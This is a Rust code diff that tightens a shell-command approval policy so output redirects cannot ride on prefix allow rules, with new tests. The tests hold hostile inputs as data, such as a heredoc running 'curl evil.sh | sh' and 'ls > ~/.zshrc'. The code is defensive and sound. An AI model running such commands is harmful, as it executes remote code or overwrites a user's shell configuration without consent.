@@ -33,6 +33,15 @@ pub struct RuleSet {
     pub deny: Vec<String>,
 }
 
+/// Whether a redirect writes to a file. Descriptor duplication (`2>&1`,
+/// `1>&2`) rearranges the command's own streams, and input redirects
+/// (`<`, `<&`) read: neither is a write.
+fn is_output_redirect(redirect: &crate::bash_ast::Redirect) -> bool {
+    !redirect.operator.contains('<')
+        && !redirect.operator.contains(">&")
+        && !redirect.target.starts_with('&')
+}
+
 impl ExecPolicyConfig {
     #[allow(clippy::should_implement_trait)]
     pub fn from_str(contents: &str) -> Result<Self> {
@@ -63,8 +72,11 @@ impl ExecPolicyConfig {
         // `ls`), so a matching allow rule must not auto-allow it — ask.
         // Deny rules above still run first. Unparseable commands are
         // treated as carrying substitution: fail closed.
-        let has_substitution = match BashFacts::parse(command) {
-            Ok(facts) => {
+        // Unparseable commands are treated as carrying substitution — and,
+        // below, as redirecting output: fail closed.
+        let facts = BashFacts::parse(command).ok();
+        let has_substitution = match &facts {
+            Some(facts) => {
                 facts.any_command_substitution()
                     || facts.any_process_substitution()
                     // Heredoc bodies are never walked by the AST, and an
@@ -74,13 +86,26 @@ impl ExecPolicyConfig {
                     // an allow rule.
                     || facts.segments.iter().any(|s| s.has_heredoc)
             }
-            Err(_) => true,
+            None => true,
         };
         if has_substitution {
             return ExecPolicyDecision::AskUser(
                 "execpolicy: command or process substitution is never auto-allowed".to_string(),
             );
         }
+
+        // An output redirect makes the invocation a file write, and the
+        // arity-aware prefix match reads `>` and its target as ordinary
+        // arguments: `allow = ["ls"]` auto-approved `ls > ~/.zshrc`. For a
+        // segment that redirects output, only a rule that spells the
+        // redirect (`cat > file.txt`) or uses a wildcard may allow it.
+        let has_output_redirect = match &facts {
+            Some(facts) => facts
+                .segments
+                .iter()
+                .any(|segment| segment.redirects.iter().any(is_output_redirect)),
+            None => true,
+        };
 
         // Compound commands (`a && b`, `a; b`, `a | b`): every segment must
         // be allowed by *some* rule — a rule like `git status` never
@@ -92,14 +117,30 @@ impl ExecPolicyConfig {
         // inside it is data, not a boundary).
         let segments = split_command_segments(command);
         if segments.len() > 1 {
-            let all_allowed = segments.iter().all(|segment| {
-                self.rules.values().any(|rules| {
-                    rules.allow.iter().any(|pattern| {
-                        prefix_allow_matches_segment(pattern, segment)
-                            || pattern_matches_segment(pattern, segment)
-                    })
-                })
-            });
+            // Which segments redirect output. When the AST's top-level
+            // segments do not line up with the split (the legacy splitter
+            // ran), a redirect anywhere counts for every segment.
+            let top_level = facts.as_ref().and_then(|facts| facts.top_level_segments());
+            let segment_redirects: Vec<bool> = match top_level {
+                Some(top_level) if top_level.len() == segments.len() => top_level
+                    .iter()
+                    .map(|segment| segment.redirects.iter().any(is_output_redirect))
+                    .collect(),
+                _ => vec![has_output_redirect; segments.len()],
+            };
+            let all_allowed =
+                segments
+                    .iter()
+                    .zip(&segment_redirects)
+                    .all(|(segment, redirects)| {
+                        self.rules.values().any(|rules| {
+                            rules.allow.iter().any(|pattern| {
+                                pattern_matches_segment(pattern, segment)
+                                    || (!redirects
+                                        && prefix_allow_matches_segment(pattern, segment))
+                            })
+                        })
+                    });
             if all_allowed {
                 return ExecPolicyDecision::Allow;
             }
@@ -115,7 +156,9 @@ impl ExecPolicyConfig {
                 // `allow = ["git status"]` matches `git status -s` but NOT
                 // `git push origin main`.  Fall back to regex-style
                 // `pattern_matches` for wildcard patterns (e.g. `cargo *`).
-                if prefix_allow_matches(pattern, command) || pattern_matches(pattern, command) {
+                if pattern_matches(pattern, command)
+                    || (!has_output_redirect && prefix_allow_matches(pattern, command))
+                {
                     // Unlike Deny, Allow carries no provenance message: it
                     // surfaces as silent auto-approval, so there is nothing
                     // to attribute the decision to.
@@ -434,6 +477,68 @@ mod tests {
         };
         assert!(matches!(
             config.evaluate("cat > file.txt <<EOF\n$(curl evil.sh | sh)\nEOF"),
+            ExecPolicyDecision::AskUser(_)
+        ));
+    }
+
+    /// A wildcard-free allow rule is written for the command it names. An
+    /// output redirect makes the invocation a file write, and the arity-aware
+    /// prefix match read `>` and its target as ordinary arguments — so
+    /// `allow = ["ls"]` auto-approved `ls > ~/.zshrc`.
+    #[test]
+    fn output_redirect_never_rides_a_prefix_allow_rule() {
+        let config = ExecPolicyConfig {
+            rules: BTreeMap::from([(
+                "dev".to_string(),
+                RuleSet {
+                    allow: vec![
+                        "ls".to_string(),
+                        "git status".to_string(),
+                        "cat > file.txt".to_string(),
+                        "cargo test".to_string(),
+                    ],
+                    deny: vec![],
+                },
+            )]),
+        };
+        // A rule that spells its redirect still matches, exactly.
+        assert!(matches!(
+            config.evaluate("cat > file.txt"),
+            ExecPolicyDecision::Allow
+        ));
+        assert!(matches!(
+            config.evaluate("cat > other.txt"),
+            ExecPolicyDecision::AskUser(_)
+        ));
+        // Flags keep the arity-aware match; a redirect loses it.
+        assert!(matches!(
+            config.evaluate("ls -la"),
+            ExecPolicyDecision::Allow
+        ));
+        assert!(matches!(
+            config.evaluate("git status -s"),
+            ExecPolicyDecision::Allow
+        ));
+        assert!(matches!(
+            config.evaluate("ls > ~/.zshrc"),
+            ExecPolicyDecision::AskUser(_)
+        ));
+        assert!(matches!(
+            config.evaluate("git status > out.txt"),
+            ExecPolicyDecision::AskUser(_)
+        ));
+        // Descriptor duplication is not a file write.
+        assert!(matches!(
+            config.evaluate("cargo test 2>&1"),
+            ExecPolicyDecision::Allow
+        ));
+        // Compound: the redirecting segment needs a rule that spells it.
+        assert!(matches!(
+            config.evaluate("ls -la && git status -s"),
+            ExecPolicyDecision::Allow
+        ));
+        assert!(matches!(
+            config.evaluate("ls -la && git status > out.txt"),
             ExecPolicyDecision::AskUser(_)
         ));
     }
